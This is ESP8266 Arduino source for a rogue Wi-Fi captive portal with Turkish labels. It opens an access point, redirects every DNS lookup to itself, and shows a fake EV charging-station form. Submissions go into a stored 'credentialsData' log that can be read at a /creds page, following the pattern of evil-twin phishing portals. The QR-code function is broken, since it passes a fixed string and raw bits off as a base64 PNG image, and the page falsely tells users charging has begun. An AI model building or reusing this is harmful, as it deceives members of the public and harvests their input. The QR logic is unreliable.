String sanitizeInput(String input) {
  input.replace("<", "&lt;");
  input.replace(">", "&gt;");
  return input;
}


void readData() {
  File file = LittleFS.open("/SavedFile.txt", "r");
  if (!file) return;
  credentialsData = file.readString();
  file.close();
  if (credentialsData.length() > 0) savedData = true;
}

void writeData(const String& data) {
  File file = LittleFS.open("/SavedFile.txt", "w");
  if (file) {
    file.print(data);
    file.close();
  }
}

void deleteData() {
  LittleFS.remove("/SavedFile.txt");
}


String index() {
  return String(chargingStationPage);
}


String posted() {
  String stationID = sanitizeInput(webServer.arg("station_id"));
  String power = sanitizeInput(webServer.arg("power"));
  String duration = sanitizeInput(webServer.arg("duration"));
  String mode = sanitizeInput(webServer.arg("mode"));

  String newEntry = "<li><b>İstasyon:</b> " + stationID +
                    ", <b>Güç:</b> " + power + " kW, <b>Süre:</b> " + duration +
                    " dk, <b>Mod:</b> " + mode + "</li>";

  Serial.println("Yeni Şarj Talebi:");
  Serial.println(newEntry);

  readData();
  credentialsData += newEntry;
  writeData(credentialsData);
  savedData = true;


  String qrPage = generateQRCode("http://"+APIP.toString()+"/charging");
  return qrPage;
}


String creds() {
  String html = "<html><body><h2>Kayıtlı Veriler</h2><ol>";
  html += credentialsData;
  html += "</ol><a href='/'>Geri</a> | <a href='/clear'>Temizle</a></body></html>";
  return html;
}


String clear() {
  credentialsData = "";
  savedData = false;
  deleteData();
  return "<html><body><h2>Veriler temizlendi!</h2><a href='/'>Geri Dön</a></body></html>";
}


String generateQRCode(String text) {
  QRCode qrcode;
  uint8_t qrcodeData[qrcode_getBufferSize(3)];  // QR boyutu 3x3
  qrcode_initText(&qrcode, qrcodeData, 3, 0, text.c_str());

  String qrHTML = "<html><body><h2>Şarj Başlatıldı!</h2>";
  qrHTML += "<p>Baslatmak icin karekodu telefonunuza okutun.</p><br><br>";

  String base64QRCode = "1232443";  


  for (int y = 0; y < 3; y++) {
    for (int x = 0; x < 3; x++) {
      if (qrcode_getModule(&qrcode, x, y)) {
        base64QRCode += "1";  
      } else {
        base64QRCode += "0";  
      }
    }
  }


  qrHTML += "<img src='data:image/png;base64," + base64QRCode + "' />";  
  qrHTML += "</body></html>";

  return qrHTML;
}


void BLINK() {
  for (int j = 0; j < 5; j++) {
    digitalWrite(LED_BUILTIN, LOW);
    delay(500);
    digitalWrite(LED_BUILTIN, HIGH);
    delay(500);
  }
}

void setup() {
  bootTime = lastActivity = millis();
  Serial.begin(115200);
  pinMode(LED_BUILTIN, OUTPUT);
  digitalWrite(LED_BUILTIN, HIGH);

  if (!LittleFS.begin()) {
    Serial.println("LittleFS mount failed");
    return;
  }

  readData();

  WiFi.mode(WIFI_AP);
  WiFi.softAPConfig(APIP, APIP, IPAddress(255, 255, 255, 0));
  WiFi.softAP(SSID_NAME);

  dnsServer.start(DNS_PORT, "*", APIP);

  webServer.on("/", []() {
    webServer.send(HTTP_CODE, "text/html", index());
  });
  webServer.on("/post", HTTP_POST, []() {
    webServer.send(HTTP_CODE, "text/html", posted());
    BLINK();
  });
  webServer.on("/creds", []() {
    webServer.send(HTTP_CODE, "text/html", creds());
  });
  webServer.on("/clear", []() {
    webServer.send(HTTP_CODE, "text/html", clear());
  });
  webServer.on("/charging", []() {
    String qrPage = generateQRCode("http://"+APIP.toString());
    webServer.send(HTTP_CODE, "text/html", qrPage);
  });
  webServer.onNotFound([]() {
    webServer.send(HTTP_CODE, "text/html", index());
  });

  webServer.begin();
  Serial.println("Captive portal çalıştı.");
}

void loop() {
  if ((millis() - lastTick) > TICK_TIMER) lastTick = millis();
  dnsServer.processNextRequest();
  webServer.handleClient();

  i++;
  if (i >= timer && savedData) {
    i = 0;
    digitalWrite(LED_BUILTIN, LOW);
    delay(50);
    digitalWrite(LED_BUILTIN, HIGH);
  }
  if (i > timer) i = 0;
}
